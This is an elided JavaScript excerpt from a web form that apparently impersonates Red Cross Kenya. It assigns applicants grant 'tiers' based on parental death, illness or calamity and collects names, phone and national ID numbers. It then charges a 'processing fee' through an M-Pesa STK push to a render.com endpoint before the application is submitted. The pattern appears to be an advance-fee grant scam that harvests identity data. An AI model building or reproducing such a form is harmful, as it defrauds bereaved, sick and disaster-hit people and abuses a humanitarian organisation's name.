...
const STK_PUSH_ENDPOINT =
    'https://redcross-kenya.onrender.com/api/payments/stk-push';
...
function assessTier() {
    ...
    if (parentDeath === 'yes-both') {
        return TIER_CONFIG.parent_death_both;
    }

    if (parentDeath === 'yes-one') {
        return TIER_CONFIG.parent_death_one;
    }

    if (disease === 'yes-chronic') {
        return TIER_CONFIG.disease_chronic;
    }

    if (disease === 'yes-acute') {
        return TIER_CONFIG.disease_acute;
    }

    if (calamity && calamity !== 'no') {
...
function displayAssessment() {
    ...
    if (!result || !resultDiv) {
        ...
        if (error) {
            error.textContent =
                'Please answer the questions to assess your tier.';
    ...
    document.getElementById('assessed-tier').textContent =
        result.label;

    document.getElementById('assessed-amount').textContent =
        'KES ' + result.amount.toLocaleString();

    document.getElementById('assessed-fee').textContent =
        'KES ' + result.fee.toLocaleString();
...
function goToStep(stepNum) {
    ...
    if (nav1) {
        nav1.className =
            'step-item ' + (stepNum >= 1 ? 'active' : '');
    }

    if (nav2) {
        nav2.className =
            'step-item ' + (stepNum >= 2 ? 'active' : '');
    }

    if (nav3) {
        nav3.className =
            'step-item ' + (stepNum >= 3 ? 'active' : '');
    }
    ...
    if (stepNum === 2) {
        ...
        const idNum =
            document.getElementById('reg-idNum')?.value.trim();

        const location =
            document.getElementById('reg-location')?.value.trim();
        ...
        if (!name || !email || !phone || !idNum || !location) {
            ...
            if (error) {
                error.textContent =
                    'Please complete all fields in Step 1.';
                error.classList.add('show');
            }
    ...
    if (stepNum === 3) {
        ...
        if (!tier) {
            const error =
                document.getElementById('step2-error');
        ...
        document.getElementById('sum-county').textContent =
            document.getElementById('reg-location').value;

        document.getElementById('sum-tier').textContent =
            label;

        document.getElementById('sum-grant').textContent =
...
async function triggerStkPush() {
    ...
    try {
        ...
        document.getElementById('reg-ref-code').value =
...
async function submitApplication() {
    ...
    const tier =
        parseInt(resultDiv?.dataset.tier);

    const amount =
        parseInt(resultDiv?.dataset.amount);

    const fee =
        parseInt(resultDiv?.dataset.fee);

    const label =
        resultDiv?.dataset.label;
